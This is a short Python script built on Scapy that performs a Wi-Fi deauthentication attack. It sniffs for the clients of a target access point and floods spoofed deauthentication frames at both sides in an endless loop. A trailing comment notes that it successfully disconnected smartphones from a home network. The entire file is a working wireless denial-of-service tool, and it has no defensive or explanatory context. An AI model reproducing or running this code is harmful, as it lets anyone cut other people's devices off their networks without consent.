#!/usr/bin/python
# ^This ensures that the script is run under correct context 

#Suppress Scapy IPv6 warning
import logging
from scapy.all import *
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from threading import Thread
import sys, os, signal

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan

broadcast = "ff:ff:ff:ff:ff:ff"
clientList = []
deauthPkts = []
AP_MAC = sys.argv[1].lower()

def signal_handler(signal, frame):
    print("\n---------- Quiting... ----------\n")
    os.system("kill -9 " + (str(os.getpid())) )
    sys.exit(1)

def Deauth(deauthPkts):
    time.sleep(5)
    print R+ "Deauthing..." +W
    if len(deauthPkts) == 0:
        pass
    else:
        while True:
            try:    
                for pkt in deauthPkts:
                    sendp(pkt, iface="wlan0mon", verbose=0)
            except KeyboardInterrupt:
                break

def ClientScan(pkt):
    if pkt.haslayer(Dot11):
        #if packet addresses exist and Destination is not broadcast
        if pkt.addr1 and pkt.addr2 and pkt.addr1 != broadcast:
            if AP_MAC == pkt.addr1:
                #If it is Assocciation Req or Resp OR Reassocciation Req or Resp
                if pkt.type in [0, 1, 2, 3, 4, 5]:
                    if (pkt.addr2 not in clientList) and pkt.addr2 != "":
                        clientList.append(pkt.addr2)
                        print O+ "AP: " +W+ pkt.addr1 +O+ "   Client: " +W+ pkt.addr2

                        deauthPkts.append(RadioTap() /\
                                Dot11(addr1=pkt.addr1, addr2=pkt.addr2, addr3=pkt.addr2) /\
                                Dot11Deauth(reason=1))
                        
                        deauthPkts.append(RadioTap() /\
                                Dot11(addr1=pkt.addr2, addr2=pkt.addr1, addr3=pkt.addr1) /\
                                Dot11Deauth(reason=1))
                        
                        thread = Thread(target = Deauth, args=(deauthPkts,))
                        thread.start()

if __name__ == "__main__":
    os.system("clear")
    signal.signal(signal.SIGINT, signal_handler)

    print B+ "Listing clients connected to %s\nPlease wait..." % (AP_MAC)
    sniff(iface="wlan0mon", prn=ClientScan)

'''
addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
multi-APs to one gateway

Tip: Some clients ignore broadcast deauthentications
Successfuly deauthed smartphones from home network
Computers seem to ignore broadcast deauth <<<<<< TODO
'''